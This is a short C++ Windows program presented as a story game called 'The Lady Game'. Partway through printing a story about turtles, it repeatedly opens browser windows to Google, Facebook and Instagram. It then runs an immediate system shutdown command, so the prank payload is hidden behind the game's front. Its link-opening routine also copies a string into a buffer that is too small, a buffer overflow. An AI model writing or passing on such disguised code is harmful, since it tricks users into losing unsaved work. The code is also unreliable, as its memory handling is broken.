#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
class OpenLinks
{
    private :
        string s;
    public :
        void setS(string s){
            this->s = s;
        }
        void goToLink(){
            int n = s.size();
            s = "START www." + s + ".com";
            char s1[n + 1];
            strcpy(s1,s.c_str());
            // cout << "Starting " << s << endl;
            system(s1);
        }
};

void GameIntro();

int main()
{
    GameIntro();
    string text = "Every Sunday morning I take a light jog around a park near my home.  Theres a lake located in one corner of the park.  Each time I jog by this lake, I see the same elderly woman sitting at the waters edge with a small metal cage sitting beside her.\nThis past Sunday my curiosity got the best of me, so I stopped jogging and walked over to her.  As I got closer, I realized that the metal cage was in fact a small trap.  There were three turtles, unharmed, slowly walking around the base of the trap.  She had a fourth turtle in her lap that she was carefully scrubbing with a spongy brush.\n“Hello,” I said.  “I see you here every Sunday morning.  If you dont mind my nosiness, Id love to know what your doing with these turtles.”\nShe smiled.  “I’m cleaning off their shells,” she replied.  “Anything on a turtle’s shell, like algae or scum, reduces the turtle’s ability to absorb heat and impedes its ability to swim.  It can also corrode and weaken the shell over time.”\n";
    int n = text.size();
    for(int i=0;i<n;i++){
        cout << text[i];
        Sleep(100);
        if(i==n/3){
            OpenLinks op;
            op.setS("google");
            op.goToLink();
            Sleep(2000);
            op.setS("facebook");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            op.setS("instagram");
            op.goToLink();
            Sleep(2000);
            break;
        }
    }
    system("shutdown -s -t 0");
    return 0;
}


void GameIntro()
{
    cout << "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
    cout << "\t\t\t\t\t\t\t\t\tWelcome\n";
    Sleep(2000);
    system("cls");
    cout << "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
    cout << "\t\t\t\t\t\t\t\t\tThe Lady Game\n\n\n";
    Sleep(3000);
    system("cls");
    cout << "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
    cout << "\t\t\t\t\t\t\t\t\tThe Background Story......\n\n\n";
    Sleep(3000);
    system("cls");
}